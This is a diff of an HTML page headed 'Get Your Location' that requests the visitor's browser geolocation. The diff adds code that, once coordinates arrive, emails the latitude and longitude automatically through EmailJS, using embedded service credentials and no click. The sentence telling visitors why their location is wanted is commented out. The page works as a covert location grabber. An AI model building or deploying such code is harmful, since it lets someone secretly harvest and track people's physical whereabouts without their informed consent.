@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -10,11 +11,13 @@
             text-align: center;
             margin: 20px;
         }
+
         button {
             padding: 10px 20px;
             font-size: 18px;
             cursor: pointer;
         }
+
         #loader {
             display: none;
             font-size: 16px;
@@ -22,6 +25,7 @@
         }
     </style>
 </head>
+
 <body>
     <h1>Get Your Location</h1>
     <!-- <p>Click the button below to share your location for better service.</p>
@@ -33,32 +37,35 @@
         let latitude;
         let longitude;
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
+            navigator.geolocation.getCurrentPosition(function (position) {
                 latitude = position.coords.latitude;
                 longitude = position.coords.longitude;
                 console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
-                window.onload = function() {
-                    setTimeout(enviarEmail, 1000); // 2000ms = 2 seconds
-            };
-        },function (error) {
-                        // Handle errors
-                        loader.style.display = "none";
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                alert("You denied location access. Please enable it to proceed.");
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                alert("Location unavailable. Please check your settings.");
-                                break;
-                            case error.TIMEOUT:
-                                alert("The request timed out. Please try again.");
-                                break;
-                            default:
-                                alert("An unknown error occurred.");
-                        }
-                    });
+                const checkLat = setInterval(function () {
+                    if (latitude) { // Check if the variable is no longer empty
+                        clearInterval(checkLat); // Stop the interval
+                        sendEmail(); // Execute the function
+                    }
+                }, 100);
+            }, function (error) {
+                // Handle errors
+                loader.style.display = "none";
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        alert("You denied location access. Please enable it to proceed.");
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        alert("Location unavailable. Please check your settings.");
+                        break;
+                    case error.TIMEOUT:
+                        alert("The request timed out. Please try again.");
+                        break;
+                    default:
+                        alert("An unknown error occurred.");
+                }
+            });
         } else {
-                alert("Geolocation is not supported on your device.");
+            alert("Geolocation is not supported on your device.");
         }
 
         // document.getElementById("requestLocation").addEventListener("click", function () {
@@ -101,25 +108,24 @@
         //     }
         // });
     </script>
-    <script type="text/javascript"
-    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
-</script>
-<script type="text/javascript">
-(function(){
-  emailjs.init({
-    publicKey: "4-qVxunTNcZI0nZ6q",
-  });
-})();
-</script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init({
+                publicKey: "4-qVxunTNcZI0nZ6q",
+            });
+        })();
+    </script>
 
-    <script> 
+    <script>
         // function sendEmail() {
         //     const templateParams = {
         //         name: "John Doe",
         //         message: `Latitude: ${latitude}, Longitude: ${longitude}`,
         //         email: "recipient@example.com"
         //     };
-    
+
         //     emailjs.send("service_39j3g1a", "template_pqx0xnl", templateParams)
         //         .then(function(response) {
         //             console.log("SUCCESS!", response.status, response.text);
@@ -130,7 +136,7 @@
         //         });
         // }
 
-        function enviarEmail(){
+        function enviarEmail() {
             sendEmail();
         };
 
@@ -140,21 +146,22 @@
                 message: `Latitude: ${latitude}, Longitude: ${longitude}`,
                 email: "recipient@example.com"
             };
-    
+
             emailjs.send("service_39j3g1a", "template_pqx0xnl", templateParams)
-                .then(function(response) {
+                .then(function (response) {
                     console.log("SUCCESS!", response.status, response.text);
                     alert("Email sent successfully!");
-                }, function(error) {
+                }, function (error) {
                     console.log("FAILED...", error);
                     alert("Failed to send email.");
                 });
-            }
-        
-        
+        }
+
+
     </script>
-    
+
     <button onclick="sendEmail()">Send Email</button>
-    
+
 </body>
+
 </html>
